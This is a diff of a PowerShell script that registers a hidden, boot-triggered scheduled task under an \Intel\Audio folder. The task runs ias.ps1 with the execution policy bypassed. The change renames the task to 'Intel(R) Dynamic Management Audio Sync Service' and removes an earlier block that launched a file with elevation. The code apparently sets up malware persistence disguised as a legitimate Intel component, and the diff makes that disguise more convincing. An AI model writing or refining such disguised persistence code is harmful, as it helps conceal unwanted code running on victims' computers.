@@ -37,35 +37,18 @@ if (-Not (Test-Path "$TargetFile")) {
   Write-Output "Zip file removed"
 }
 
-
-if (Get-Process -Name 'Intel Audio Sync' -ErrorAction SilentlyContinue) {
-  exit
-} else {
-  Start-Process -FilePath "$TargetFile" -Verb RunAs -ErrorAction SilentlyContinue
-  exit
-}
-
-
-
-
-
-
-
-
-
-$TaskName = "Intel Audio Sync"
-$TaskDescription = "Running Intel Audio Sync from Task Scheduler"
+$TaskDescription = "Running Intel(R) Dynamic Management Audio Sync Service from Task Scheduler"
 $TaskCommand = "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe"
 $TaskScript = "$TargetFolder\ias.ps1"
 $TaskArg = "-WindowStyle Hidden -NonInteractive -Executionpolicy bypass -file $TaskScript"
 $TaskStartTime = [datetime]::Now.AddMinutes(1)
 $service = new-object -ComObject("Schedule.Service")
 $service.Connect()
+$TaskName = "Intel(R) Dynamic Management Audio Sync Service"
 $rootFolder = $service.GetFolder("\Intel\Audio")
 $TaskDefinition = $service.NewTask(0)
 $TaskDefinition.RegistrationInfo.Description = "$TaskDescription"
 $TaskDefinition.Settings.Enabled = $true
 $TaskDefinition.Settings.AllowDemandStart = $true
 $triggers = $TaskDefinition.Triggers
-#http://msdn.microsoft.com/en-us/library/windows/desktop/aa383915(v=vs.85).aspx
 $trigger = $triggers.Create(8)
